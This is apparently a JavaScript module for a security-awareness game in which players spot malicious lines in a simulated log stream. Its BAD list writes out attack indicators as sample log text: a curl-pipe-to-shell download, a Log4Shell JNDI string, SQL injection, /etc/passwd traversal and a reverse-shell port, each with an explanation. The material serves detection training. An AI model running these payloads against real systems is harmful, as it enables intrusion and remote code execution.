// Needle in the logs: a live log stream scrolls by. Click the malicious lines before they're gone.
import { h } from "../core.js";
import { LH_GOOD, LH_BAD } from "../content/legacy.js";

const ip = (r) => `${[10, 172, 192][Math.floor(r() * 3)]}.${Math.floor(r() * 255)}.${Math.floor(r() * 255)}.${Math.floor(r() * 255)}`;
const pub = (r) => `${[45, 91, 185, 203, 198][Math.floor(r() * 5)]}.${Math.floor(r() * 255)}.${Math.floor(r() * 255)}.${Math.floor(r() * 255)}`;
const user = (r) => ["kevin.f", "helen.h", "svc_backup", "priya.n", "dan.d", "marco.r", "sam.i"][Math.floor(r() * 7)];
const ts = () => new Date().toISOString().slice(11, 19);
const GOOD = [
  (r) => `sshd[${1000 + Math.floor(r() * 9000)}]: Accepted publickey for deploy from ${ip(r)} port ${40000 + Math.floor(r() * 9999)}`,
  (r) => `nginx: ${ip(r)} "GET /static/app.${Math.floor(r() * 99)}.css HTTP/1.1" 200 ${1000 + Math.floor(r() * 9000)}`,
  (r) => `nginx: ${ip(r)} "GET /api/health HTTP/1.1" 200 2`,
  (r) => `named: client ${ip(r)} query: login.microsoftonline.com IN A`,
  (r) => `Security 4624: logon type 2 user=${user(r)} host=FIN-LT-0${Math.floor(r() * 90 + 10)}`,
  () => `CRON[${Math.floor(Math.random() * 9e4)}]: (root) CMD (/usr/local/bin/backup.sh --incremental)`,
  (r) => `okta: user.session.start ${user(r)} MFA=push result=SUCCESS geo=SG`,
  (r) => `proc: ${LH_GOOD[Math.floor(r() * LH_GOOD.length)]}`,
  (r) => `fw: ALLOW tcp ${ip(r)}:${50000 + Math.floor(r() * 9999)} -> 10.0.0.5:443`,
  () => `kernel: [UFW BLOCK] IN=eth0 SRC=${["45.155.205.1", "185.220.101.4"][Math.floor(Math.random() * 2)]} DPT=23 (blocked scan, expected)`,
];
const BAD = [
  [(r) => `nginx: ${pub(r)} "GET /item?id=1%27%20OR%20%271%27=%271 HTTP/1.1" 200 88412`, "SQL injection that returned a big response."],
  [(r) => `nginx: ${pub(r)} "GET /download?f=..%2f..%2f..%2fetc%2fpasswd HTTP/1.1" 200 2114`, "Path traversal that worked (200)."],
  [(r) => `named: client ${ip(r)} query: aGVsbG8gZnJvbSB0aGUgaW5zaWRl.x.cdn-sync.io IN TXT`, "Base64 in a subdomain: DNS tunnelling."],
  [(r) => `nginx: ${pub(r)} "GET / HTTP/1.1" ua="\${jndi:ldap://${pub(r)}/a}"`, "Log4Shell probe in the user agent."],
  [(r) => `Security 4720: user account created name=helpdesk2 by=${user(r)} at 03:14`, "A new account at 3 AM by someone who doesn't create accounts."],
  [() => `Security 1102: The audit log was cleared. Subject: ADMIN-TMP`, "Someone cleared the security log."],
  [(r) => `proc: w3wp.exe -> cmd.exe /c whoami /priv (host WEB-DMZ-3)`, "The web server process spawning a shell: web shell."],
  [(r) => `bash_history(${user(r)}): curl -s http://${pub(r)}/x.sh | sh`, "Piping a downloaded script straight into the shell."],
  [(r) => `okta: user.mfa.factor.deactivate ${user(r)} by ${user(r)} geo=RU`, "MFA removed from abroad. Account takeover."],
  [(r) => `fw: ALLOW tcp 10.0.4.${Math.floor(r() * 200)}:51123 -> ${pub(r)}:4444`, "Outbound to port 4444: a classic reverse shell port."],
  [(r) => { const b = LH_BAD[Math.floor(r() * LH_BAD.length)]; return `proc: ${Array.isArray(b) ? b[0] : b}`; }, ""],
];

export const LOGS = {
  id: "logs", label: "Needle in the logs", duration: 60,
  how: "Log lines stream past. Click the malicious ones before they scroll away. Faster clicks score more. Clicking innocent lines costs points.",
  keys: "click lines",
  start(ctx) {
    const { stage, r } = ctx;
    stage.classList.add("logstage");
    const term = h("div.term", { role: "log", "aria-live": "off" }); const why = h("p.why", { "aria-live": "polite" });
    stage.append(term, why);
    let alive = true, t = 0, sinceBad = 0, timer = 0;
    const add = () => {
      if (!alive) return;
      const bad = sinceBad >= 3 && r() < 0.32 + Math.min(0.2, t / 300);
      let text, reason = "";
      if (bad) { const b = BAD[Math.floor(r() * BAD.length)]; text = b[0](r); reason = b[1] || (LH_BAD.find((x) => Array.isArray(x) && text.includes(x[0]))?.[1] ?? "Living-off-the-land trick."); sinceBad = 0; }
      else { text = GOOD[Math.floor(r() * GOOD.length)](r); sinceBad++; }
      const line = h("div.logline", h("span.ts", ts() + " "), text);
      line._bad = bad; line._why = reason; line._born = performance.now();
      line.addEventListener("click", () => hit(line));
      term.append(line);
      while (term.children.length > 15) { const old = term.firstElementChild; if (old._bad && !old._hit) { ctx.add(-50); why.textContent = "Missed one: " + old.textContent.slice(9, 90) + "…"; } old.remove(); }
      term.scrollTop = term.scrollHeight;
      t += 1;
      timer = setTimeout(add, Math.max(280, 720 - t * 5) * (0.75 + r() * 0.5));
    };
    const hit = (line) => {
      if (line._hit || !alive) return; line._hit = true;
      const sr = stage.getBoundingClientRect(), lr = line.getBoundingClientRect(); const x = lr.left - sr.left + Math.min(lr.width, 360) * 0.6, y = lr.top - sr.top;
      if (line._bad) {
        const age = (performance.now() - line._born) / 1000; const pts = Math.round(150 + Math.max(0, 6 - age) * 25);
        line.classList.add("caught"); ctx.add(pts, x, y); ctx.sfx("coin"); ctx.burst(x, y + 8, "var(--alarm)", 10); why.textContent = "Caught: " + line._why;
      } else { line.classList.add("oops"); ctx.add(-80, x, y); ctx.sting("fail"); why.textContent = "That one was normal traffic."; }
    };
    for (let i = 0; i < 8; i++) { term.append(h("div.logline.dim", h("span.ts", ts() + " "), GOOD[i % GOOD.length](r))); }
    add();
    return () => { alive = false; clearTimeout(timer); };
  },
};
